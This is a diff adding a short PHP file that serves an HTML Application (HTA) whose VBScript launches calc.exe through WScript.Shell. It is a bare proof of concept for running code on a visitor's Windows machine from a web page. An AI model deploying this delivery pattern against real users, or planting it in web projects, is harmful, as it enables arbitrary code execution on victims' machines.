@@ -1,0 +1,7 @@
+<?php
+    header("Content-type: application/hta");
+?>
+<script language="VBScript">
+      Set shell = CreateObject("Wscript.Shell")
+      shell.Run "calc.exe"
+	  </script>
